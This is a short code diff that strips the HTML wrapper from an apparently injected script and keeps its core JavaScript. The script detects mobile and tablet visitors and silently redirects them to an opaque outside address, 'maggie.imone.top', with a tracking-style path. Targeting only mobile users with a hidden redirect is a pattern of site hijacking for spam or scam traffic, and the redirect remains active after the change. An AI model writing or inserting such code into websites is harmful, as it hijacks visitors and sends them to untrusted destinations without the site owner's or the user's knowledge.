@@ -1,11 +1,3 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title></title>
-</head>
-<body>
-</body>
-<script type="text/javascript">
 var md = new MobileDetect(window.navigator.userAgent);
 if (md.mobile() || md.tablet()) {
 var redirect = false;
@@ -17,6 +9,4 @@ redirect = true;
 }
 
 if (redirect) {
-location.href= 'http://maggie.imone.top/001-camille1695019806'; }}</script>
-
-</html>
+location.href= 'http://maggie.imone.top/001-camille1695019806'; }}
